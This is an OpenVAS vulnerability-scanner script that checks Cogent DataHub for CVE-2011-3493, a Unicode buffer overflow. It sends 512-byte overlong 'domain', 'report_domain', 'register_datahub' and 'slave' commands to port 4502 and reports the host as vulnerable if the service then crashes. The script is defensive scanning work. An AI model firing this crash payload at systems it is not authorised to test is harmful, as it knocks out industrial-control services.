###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cogent_datahub_unicode_bof_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Cogent DataHub Unicode Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation may allow remote attackers to execute
arbitrary code within the context of the privileged domain or cause a denial
of service condition.

Impact Level: System/Application";

tag_affected = "Cogent DataHub 7.1.1.63 and prior.";

tag_insight = "The flaw is due to a stack based unicode buffer overflow error
in the 'DH_OneSecondTick' function, which can be exploited by sending specially
crafted 'domain', 'report_domain', 'register_datahub', or 'slave' commands.";

tag_solution = "Upgrade to Cogent DataHub version 7.1.2 or later.
For updates refer to http://www.cogentdatahub.com/Products/Cogent_DataHub.html";

tag_summary = "The host is running Cogent DataHub and is prone to buffer
overflow vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802246");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-09-22 10:24:03 +0200 (Thu, 22 Sep 2011)");
  script_bugtraq_id(49611);
  script_cve_id("CVE-2011-3493");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Cogent DataHub Unicode Buffer Overflow Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45967");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/cogent_1-adv.txt");
  script_xref(name : "URL" , value : "http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-03.pdf");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(4502);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");

## Get Default Port
port = 4502;
if(!get_port_state(port)){
 exit(0);
}

## Open the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Send normal request
req = string('(domain "openvas-test")', raw_string(0x0a));
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);

## Confirm Application
if('success "domain" "openvas-test"' >!< res){
  exit(0);
}

## Construct Attack Request
attack =  crap(data: "a", length:512);
req = string('(domain "', attack, '")', raw_string(0x0a),
             '(report_domain "', attack, '" 1)', raw_string(0x0a),
             '(register_datahub "',attack, '")\r\n', raw_string(0x0a),
             '(slave "', attack, '" flags id1 id2 version secs nsecs)',
             raw_string(0x0a));

## Sending Attack
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

sleep(5);

## Open the socket and
## Check server is dead or alive
soc = open_sock_tcp(port);
if(!soc){
  security_message(port);
  exit(0);
}
close(soc);
